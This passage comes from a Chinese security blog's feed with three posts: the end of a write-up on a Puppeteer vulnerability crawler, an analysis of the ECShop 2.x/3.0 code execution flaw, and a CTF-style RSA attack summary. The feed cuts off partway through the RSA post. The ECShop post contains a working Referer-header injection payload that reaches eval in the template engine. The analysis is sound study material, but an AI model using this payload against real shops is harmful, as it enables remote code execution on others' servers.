href="http://xueshu.baidu.com/usercenter/paper/show?paperid=232b0da253211ecf9e2c85cb513d0bd3&amp;site=xueshu_se" target="_blank" rel="noopener">http://xueshu.baidu.com/usercenter/paper/show?paperid=232b0da253211ecf9e2c85cb513d0bd3&amp;site=xueshu_se</a></p><blockquote><p>挖坑</p></blockquote><h2 id="性能优化"><a href="#性能优化" class="headerlink" title="性能优化"></a>性能优化</h2><h3 id="图片资源优化"><a href="#图片资源优化" class="headerlink" title="图片资源优化"></a>图片资源优化</h3><p>禁止浏览器加载图片 =&gt; 返回一个fake img<br>实际测试过程中，有的网站在加载图片失败后，会尝试重新加载，这样会陷入一个死循环，导致发送大量数据包，占用性能。<br><img src="https://i.loli.net/2020/01/05/HIsrhXxkKeNiLGY.jpg" alt="-w598"></p><p><img src="https://i.loli.net/2020/01/05/wmfDyBQ2UZM7CI6.jpg" alt="-w1679"><br>代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> browser = <span class="keyword">await</span> puppeteer.launch(launchOptions);</span><br><span class="line"><span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line"><span class="keyword">await</span> preparePage(page);</span><br><span class="line"><span class="keyword">await</span> page.setRequestInterception(<span class="literal">true</span>);     <span class="comment">// 开启拦截功能</span></span><br><span class="line"><span class="keyword">await</span> page.on(<span class="string">'request'</span>, interceptedRequest =&gt; &#123;</span><br><span class="line">    <span class="comment">// 拦截图片请求</span></span><br><span class="line">    <span class="keyword">if</span> (interceptedRequest.resourceType() === <span class="string">'image'</span> || interceptedRequest.url().endsWith(<span class="string">'.ico'</span>)) &#123;</span><br><span class="line">        <span class="comment">//console.log(`abort image: $&#123;interceptedRequest.url()&#125;`);</span></span><br><span class="line">        <span class="keyword">let</span> images = fs.readFileSync(<span class="string">'public/image.png'</span>);</span><br><span class="line">        interceptedRequest.respond(&#123;</span><br><span class="line">            <span class="string">'contentType'</span>: <span class="string">' image/png'</span>,</span><br><span class="line">            <span class="string">'body'</span>: Buffer.from(images)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        interceptedRequest.continue();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><h3 id="拦截logout请求"><a href="#拦截logout请求" class="headerlink" title="拦截logout请求"></a>拦截logout请求</h3><p>避免爬虫爬行到登出链接，导致Cookie失效，这里做一个简单的拦截：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> page.on(<span class="string">'request'</span>, interceptedRequest =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span>(interceptedRequest.url().indexOf(<span class="string">"logout"</span>) !== <span class="number">-1</span>)&#123;</span><br><span class="line">        interceptedRequest.abort();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        interceptedRequest.continue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p><h2 id="puppeteer并发异步调度方案"><a href="#puppeteer并发异步调度方案" class="headerlink" title="puppeteer并发异步调度方案"></a>puppeteer并发异步调度方案</h2><p>简单粗暴，这里使用<a href="https://github.com/thomasdondorf/puppeteer-cluster#api" target="_blank" rel="noopener">puppeteer-cluster</a>库解决单Chrome多tab并发需求，也可以参考使用guimaizi师傅的demo:<a href="http://www.guimaizi.com/archives/535" target="_blank" rel="noopener">puppeteer异步并发方案</a></p><h2 id="开源"><a href="#开源" class="headerlink" title="开源"></a>开源</h2><p>这里边其实还有很多坑要填，师傅们多指点交流~<br>开源链接：<a href="https://github.com/Passer6y/CrawlerVuln" target="_blank" rel="noopener">https://github.com/Passer6y/CrawlerVuln</a><br>（求star</p><h2 id="待实现的需求"><a href="#待实现的需求" class="headerlink" title="待实现的需求"></a>待实现的需求</h2><p><strong>弹窗取消</strong></p><p><strong>代码注入时间</strong><br>链接收集有点不太全，触发完了事件后得等一会再收集url。</p><p><strong>待解决的bug</strong><br><code>page.once</code> 确定抓取链接时间</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;文章首发先知社区：&lt;a href=&quot;https://xz.aliyun.com/t/7064&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/7064&lt;/a&gt;  &lt;/p&gt;
&lt;p&gt;在两年前谷歌推出了一个Headless Chrome NodeJS API:&lt;a href=&quot;https://github.com/puppeteer/puppeteer&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Puppeteer&lt;/a&gt;，后来Github一个大牛用Python封装了一套api，作为一个第三方api:&lt;a href=&quot;https://github.com/miyakogi/pyppeteer&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Pyppeteer&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;在去年的时候，尝试过用Pyppeteer写过动态爬虫，Python版由于是第三方一个作者封装的，更新很慢，落后官方版本很多，很多迷之BUG，比如CDP协议去操作远程chromium，很容易中断导致一堆僵尸进程的chromium关不掉。虽然最后还是顶着各种bug，写成一个勉强能用的工具，但在服务器上很吃内存，一方面也是因为写的任务调度机制也有一些问题，最后服役了许多天天，不想维护了，捡了几个漏洞就退休了。后来在平时的工作和学习中频频接触到nodeJS，于是就趁着这段时间用nodejs重新实现一遍。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Code" scheme="http://0day.design/tags/Code/"/>
    
      <category term="Web" scheme="http://0day.design/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ECShop 2.x 3.0代码执行漏洞分析</title>
    <link href="http://0day.design/2019/09/30/ECShop%202.x%203.0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://0day.design/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/</id>
    <published>2019-09-30T14:10:00.000Z</published>
    <updated>2019-09-30T14:10:40.586Z</updated>
    
    <content type="html"><![CDATA[<p>之前渗透时遇到了这样一个站，当时看到这个二次注入引发的命令执行的过程有点意思，于是抽了个时间简单的复现分析了一下<br><a id="more"></a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前渗透时遇到了这样一个站，当时看到这个命令执行的过程有点东西，于是抽了个时间复现一下</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>IDE: PHPstorm<br>代码：<br><a href="https://github.com/ec-shop/ecshop3.0.0906" target="_blank" rel="noopener">ECshop3.0</a><br><a href="https://github.com/shopex/ecshop" target="_blank" rel="noopener">ECShop 2.7.3</a></p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>ECshop3.0<br>php 5.6<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer:45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:110:&quot;*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -&quot;;s:2:&quot;id&quot;;s:4:&quot;&apos; /*&quot;;&#125;&#125;45ea207d7a2b68c49582d2d22adf953a</span><br></pre></td></tr></table></figure></p><p><img src="/2019/09/30/ECShop 2.x 3.0代码执行漏洞分析/media/15696548589918/15696662119731.jpg" alt="-w1613"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>user.php 305行渲染的代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//310行</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($back_act) &amp;&amp; <span class="keyword">isset</span>($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 如果没有user.php， 则$back_act为referer</span></span><br><span class="line">    $back_act = strpos($GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>], <span class="string">'user.php'</span>) ? <span class="string">'./index.php'</span> : $GLOBALS[<span class="string">'_SERVER'</span>][<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 330行</span></span><br><span class="line">$smarty-&gt;assign(<span class="string">'back_act'</span>, $back_act);     <span class="comment">// 渲染referer到模板</span></span><br><span class="line">$smarty-&gt;display(<span class="string">'user_passport.dwt'</span>);</span><br></pre></td></tr></table></figure></p><p>跟进<code>display</code>函数，includes/cls_template.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 106行</span><br><span class="line">$out = $this-&gt;fetch($filename, $cache_id);  // fetch模板，渲染变量</span><br><span class="line"></span><br><span class="line">if (strpos($out, $this-&gt;_echash) !== false)</span><br><span class="line">&#123;</span><br><span class="line">    $k = explode($this-&gt;_echash, $out); // _echash为定值</span><br><span class="line">    foreach ($k AS $key =&gt; $val)</span><br><span class="line">    &#123;</span><br><span class="line">        if (($key % 2) == 1)    // 如果是奇数个</span><br><span class="line">        &#123;       </span><br><span class="line">                // 45ea207d7a2b68c49582d2d22adf953a这个相当于分割符，方便从html提取出序列化数据</span><br><span class="line">            $k[$key] = $this-&gt;insert_mod($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $out = implode(&apos;&apos;, $k);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>跟进<code>insert_mod</code>函数，includes/cls_template.php 1168行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function insert_mod($name) // 处理动态内容</span><br><span class="line">&#123;</span><br><span class="line">    list($fun, $para) = explode(&apos;|&apos;, $name); // |前的为函数名，后为参数</span><br><span class="line">    $para = unserialize($para);</span><br><span class="line">    $fun = &apos;insert_&apos; . $fun;</span><br><span class="line"></span><br><span class="line">    return $fun($para);     // 可以执行insert_开头的函数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>可以通过控制referer，执行<code>insert_</code>开头的任意函数，来看includes/lib_insert.php：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// 141行</span><br><span class="line">function insert_ads($arr)</span><br><span class="line">&#123;</span><br><span class="line">    static $static_res = NULL;</span><br><span class="line"></span><br><span class="line">    $time = gmtime();</span><br><span class="line">    if (!empty($arr[&apos;num&apos;]) &amp;&amp; $arr[&apos;num&apos;] != 1)</span><br><span class="line">    &#123;</span><br><span class="line">        $sql  = &apos;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &apos; .</span><br><span class="line">                    &apos;p.ad_height, p.position_style, RAND() AS rnd &apos; .</span><br><span class="line">                &apos;FROM &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad&apos;) . &apos; AS a &apos;.</span><br><span class="line">                &apos;LEFT JOIN &apos; . $GLOBALS[&apos;ecs&apos;]-&gt;table(&apos;ad_position&apos;) . &apos; AS p ON a.position_id = p.position_id &apos; .</span><br><span class="line">                &quot;WHERE enabled = 1 AND start_time &lt;= &apos;&quot; . $time . &quot;&apos; AND end_time &gt;= &apos;&quot; . $time . &quot;&apos; &quot;.</span><br><span class="line">                    &quot;AND a.position_id = &apos;&quot; . $arr[&apos;id&apos;] . &quot;&apos; &quot; .</span><br><span class="line">                &apos;ORDER BY rnd LIMIT &apos; . $arr[&apos;num&apos;];</span><br><span class="line">        $res = $GLOBALS[&apos;db&apos;]-&gt;GetAll($sql);</span><br><span class="line">    &#125;</span><br><span class="line">    // arr可控，形成sql注入， 继续往下跟</span><br><span class="line"></span><br><span class="line">// 170行</span><br><span class="line">    foreach ($res AS $row)</span><br><span class="line">    &#123;</span><br><span class="line">        if ($row[&apos;position_id&apos;] != $arr[&apos;id&apos;]) // 查库的第2列字段</span><br><span class="line">        &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;</span><br><span class="line">        $position_style = $row[&apos;position_style&apos;]; // 查库的第9列</span><br><span class="line">        $GLOBALS[&apos;smarty&apos;]-&gt;assign(&apos;ads&apos;, $ads);</span><br><span class="line">        $val = $GLOBALS[&apos;smarty&apos;]-&gt;fetch($position_style); // 重新带入模板渲染</span><br></pre></td></tr></table></figure></p><p>接着，includes/patch/includes_cls_template_fetch_str.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$template = $this;</span><br><span class="line">return preg_replace_callback(&quot;/&#123;([^\&#125;\&#123;\n]*)&#125;/&quot;, function($r) use(&amp;$template)&#123;return $template-&gt;select($r[1]);&#125;, $source);</span><br></pre></td></tr></table></figure></p><p>调select函数，includes/cls_template.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//375行 </span><br><span class="line">return &apos;&lt;?php echo &apos; . $this-&gt;get_val(substr($tag, 1)) . &apos;; ?&gt;&apos;;</span><br></pre></td></tr></table></figure></p><p>includes/cls_template.php <code>get_val</code>593行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 处理掉变量标签</span><br><span class="line">$p = $this-&gt;make_var($val);</span><br></pre></td></tr></table></figure></p><p>跟进<code>make_var</code>, includes/cls_template.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">make_var</span><span class="params">($val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strrpos($val, <span class="string">'.'</span>) === <span class="keyword">false</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_var[$val]) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;_patchstack[$val]))</span><br><span class="line">        &#123;</span><br><span class="line">            $val = <span class="keyword">$this</span>-&gt;_patchstack[$val];</span><br><span class="line">        &#125;</span><br><span class="line">        $p = <span class="string">'$this-&gt;_var[\''</span> . $val . <span class="string">'\']'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 705行</span></span><br><span class="line">    <span class="keyword">return</span> $p;</span><br></pre></td></tr></table></figure></p><p>代码执行，includes/cls_template.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//1193行</span><br><span class="line">function _eval($content)</span><br><span class="line">&#123;</span><br><span class="line">    ob_start();</span><br><span class="line">    eval(&apos;?&apos; . &apos;&gt;&apos; . trim($content));</span><br><span class="line">    $content = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line"></span><br><span class="line">    return $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;之前渗透时遇到了这样一个站，当时看到这个二次注入引发的命令执行的过程有点意思，于是抽了个时间简单的复现分析了一下&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Crypto" scheme="http://0day.design/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>RSA小结</title>
    <link href="http://0day.design/2019/04/27/RSA%E5%B0%8F%E7%BB%93/"/>
    <id>http://0day.design/2019/04/27/RSA小结/</id>
    <published>2019-04-27T12:46:00.000Z</published>
    <updated>2019-04-27T12:35:30.811Z</updated>
    
    <content type="html"><![CDATA[<p>最近打比赛频频遇到各种学过又不会的密码学… 抽了点时间捣鼓了一下常见rsa攻击方法的原理，以后有时间继续填坑<br><a id="more"></a></p><h1 id="RSA计算过程"><a href="#RSA计算过程" class="headerlink" title="RSA计算过程"></a>RSA计算过程</h1><p>涉及3个参数： n e d, 其中 {n, d}为私钥，{n, e}为公钥</p><p><code>phi(n) = (p-1) * (q-1)</code><br>d为e膜phi(n)的逆元(phi(n)为n的欧拉函数)</p><p><code>ed ≡ 1 (mod phi(n))</code></p><p>加密解密过程：c密文，m明文<br>加密：<code>c ≡ m^e(mod n)</code><br>解密：<code>m ≡ c^d(mod n)</code></p><p>rsa中e为随机选取的一个数，一般为65537<br>n由两个大素数(p,q)之积组成，公钥{n,e}为公开的，要破解rsa就得求出d，d为e模phi(n)的逆元，要求出phi(n)，必须分解n求得p,q，从而求得<code>phi(n)=(p-1)*(q-1)</code></p><h1 id="代码基础"><a href="#代码基础" class="headerlink" title="代码基础"></a>代码基础</h1><ol><li>pow函数：<br>python底层实现平方乘和算法<br>解密：<code>m ≡ c^d(mod n)</code>使用pow函数<br><code>m=pow(c,d,n)</code></li></ol><h1 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h1><p>通过题目的数据文件，手工将参数提取：</p><ol><li>pem文件<br>1.1 私钥解密flag：<br><code>openssl rsautl -decrypt -in flag -inkey private.pem -out flag.txt</code><br>1.2 公钥加密flag<br><code>openssl  rsautl -encrypt -in FLAG -inkey public.pem -pubin -out flag.enc</code><br>1.3 获取公钥的信息<br><code>openssl  rsa -pubin -text -modulus -in warmup -in pubkey.pem</code></li></ol><ol start="2"><li>pcap文件</li><li>PPC模式</li></ol><h1 id="Crack"><a href="#Crack" class="headerlink" title="Crack"></a>Crack</h1><h2 id="直接分解n"><a href="#直接分解n" class="headerlink" title="直接分解n"></a>直接分解n</h2><p>n &lt; 512 bit: 直接分解， <a href="http://factordb.com" target="_blank" rel="noopener">http://factordb.com</a><br>n &gt; 512 bit: 使用后面方法</p><h2 id="利用公约数"><a href="#利用公约数" class="headerlink" title="利用公约数"></a>利用公约数</h2><p>题目特征：直接分解n无果后，尝试yafu。</p><p>两次公钥加密时使用的n1和n2有相同的素因子，则可以用欧几里得算法求出n1和n2的最大公因数，也就是其中一个素因子。</p><p>题目特征：给了若干个n，均不同，并且n都是2048bit、4096bit级别。</p><h2 id="Fermat方法与Pollard-rho方法"><a href="#Fermat方法与Pollard-rho方法" class="headerlink" title="Fermat方法与Pollard rho方法"></a>Fermat方法与Pollard rho方法</h2><p>p、q相差过大或相近时，可以使用Fermat方法与Pollard rho方法分解n。</p><p>开源项目: yafu</p><h2 id="低加密指数攻击"><a href="#低加密指数攻击" class="headerlink" title="低加密指数攻击"></a>低加密指数攻击</h2><p>当e(e=3)和明文过小时，可以使用这种攻击方案：</p><ol><li><code>m^e&lt;n</code>时<br>加密函数为：<code>c ≡ m^e(mod n)</code>， 若m^3&lt;n， 直接对密文c进行开三次方即可解出明文。<br>例题：</li></ol><ol start="2"><li><code>m^e&gt;n</code>时<br><code>c ≡ m^e + k*n</code>, 对<code>c+kn</code>进行三次开方，并对k进行枚举，即可求得明文m。</li></ol><h2 id="低加密指数广播攻击"><a href="#低加密指数广播攻击" class="headerlink" title="低加密指数广播攻击"></a>低加密指数广播攻击</h2><p>题目特征：一般来说都是给了三组加密的参数和明密文，其中题目很明确地能告诉你这三组的明文都是一样的，并且e都取了一个较小的数字。</p><p>分析：加密指数e选取较小，且使用相同加密指数进行群发消息(n不同)，可以使用广播攻击获得明文。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c1 ≡ m^e(mod n1)</span><br><span class="line">c2 ≡ m^e(mod n2)</span><br><span class="line">c3 ≡ m^e(mod n3)</span><br></pre></td></tr></table></figure><p>利用中国剩余定理，解出<code>m^e</code>：<br><img src="http://static.zybuluo.com/Passer6y/4e9xj3u7mweeimm65v6arw5v/image_1d9c6jjt8bqdrao66julv1vn59.png" alt="image_1d9c6jjt8bqdrao66julv1vn59.png-78.6kB"></p><p>由于e很小，所以对<code>m^e</code>进行开方即可解出</p><h2 id="低解密指数攻击"><a href="#低解密指数攻击" class="headerlink" title="低解密指数攻击"></a>低解密指数攻击</h2><p>题目特征：e看起来很大就行了。</p><blockquote><p>d为e模phi(n)的逆元，e很大那么d就小</p></blockquote><p>脚本：<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">https://github.com/pablocelayes/rsa-wiener-attack</a></p><blockquote><p>这里注意一个细节问题，如果在运行脚本的时候报错，请在脚本前加上：<br>import   sys<br>sys.setrecursionlimit(10000000)</p></blockquote><h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p>题目特征：若干次加密，每次n都一样，明文根据题意也一样即可。</p><p>使用相同模数n对相同的密文m进行加密(e不同)，可以使用共模攻击求出明文：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c1 ≡ m^e1(mod n)</span><br><span class="line">c2 ≡ m^e2(mod n)</span><br></pre></td></tr></table></figure></p><p>易知: <code>gcd(e1,e2) = 1</code><br>有: <code>s*e1 + r*e2 = 1</code><br>推出：<code>s*e1 + r*e2 ≡ 1 (mod n)</code><br>用扩展版欧几里得算法可求得s、r</p><p>构造表达式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c1^s ≡ m^(e1*s)(mod n)</span><br><span class="line">c2^r ≡ m^(e2*r)(mod n)</span><br></pre></td></tr></table></figure></p><p>联立：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c1^s * c2^r ≡ m^[(e1*s)+(e2*r)] (mod n)</span><br><span class="line">c1^s * c2^r ≡ m^1 (mod n)</span><br></pre></td></tr></table></figure></p><p>解出明文：<code>m = (c1^s * c2^r)(mod n)</code></p><h1 id="一些例题"><a href="#一些例题" class="headerlink" title="一些例题"></a>一些例题</h1><h2 id="jarvisoj-Medium-RSA"><a href="#jarvisoj-Medium-RSA" class="headerlink" title="jarvisoj: Medium RSA"></a><a href="https://www.jarvisoj.com/challenges" target="_blank" rel="noopener">jarvisoj: Medium RSA</a></h2><p>给了公钥和加密后的flag文件，先用openssl提取公钥信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ openssl  rsa -pubin -text -modulus -in warmup -in pubkey.pem </span><br><span class="line">RSA Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:</span><br><span class="line">    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:</span><br><span class="line">    be:30:dd</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr</span><br><span class="line">yigb/+l/vjDdAgMBAAE=</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure></p><p>分析, 给了我们m， 也就是phi(n)， 通过其求出p,q(①)，然后将n求出(②),通过表达式③将e的逆元d求出，从而将密文解出(⑤)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">①：modulus = (p-1)(p-1)</span><br><span class="line">②： n = p * q</span><br><span class="line">③： e*d ≡ 1 (mod modulus)</span><br><span class="line">④： 加密：c ≡ m^e (mod n)</span><br><span class="line">⑤： 解密：m ≡ c^d (mod n)</span><br></pre></td></tr></table></figure></p><p>尝试factor无解。<br>继续尝试用yafu分解m， 也就是phi(n),得到<code>p</code>和<code>q</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P39 = 319576316814478949870590164193048041239</span><br><span class="line">P39 = 275127860351348928173285174381581152299</span><br></pre></td></tr></table></figure></p><p><img src="http://static.zybuluo.com/Passer6y/ujevdi5cdxz1g9jzqe2kfun6/image_1d9eqhob11k6013iqqjilb7r9.png" alt="image_1d9eqhob11k6013iqqjilb7r9.png-17.8kB"></p><p>根据<code>e p q</code>生成私钥文件,这里用<a href="https://github.com/ohroot/rsatools" target="_blank" rel="noopener">rsatools</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 rsatool.py -o private.pem -e 65537 -p 319576316814478949870590164193048041239 -q 275127860351348928173285174381581152299</span><br></pre></td></tr></table></figure><p>接着拿着这个私钥用openssl解密：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ openssl rsautl -decrypt -in flag.enc -inkey private.pem </span><br><span class="line">PCTF&#123;256b_i5_m3dium&#125;</span><br></pre></td></tr></table></figure></p><h2 id="jarvisoj-Hard-RSA"><a href="#jarvisoj-Hard-RSA" class="headerlink" title="jarvisoj: Hard RSA"></a><a href="https://www.anquanke.com/post/id/84632" target="_blank" rel="noopener">jarvisoj: Hard RSA</a></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ openssl  rsa -pubin -text -modulus -in warmup -in pubkey.pem</span><br><span class="line">RSA Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:</span><br><span class="line">    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:</span><br><span class="line">    be:30:dd</span><br><span class="line">Exponent: 2 (0x2)</span><br><span class="line">Modulus=C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDowDQYJKoZIhvcNAQEBBQADKQAwJgIhAMJjauXD2OQ/+5erCQKPGqxsC/bNPXDr</span><br><span class="line">yigb/+l/vjDdAgEC</span><br><span class="line">-----END PUBLIC 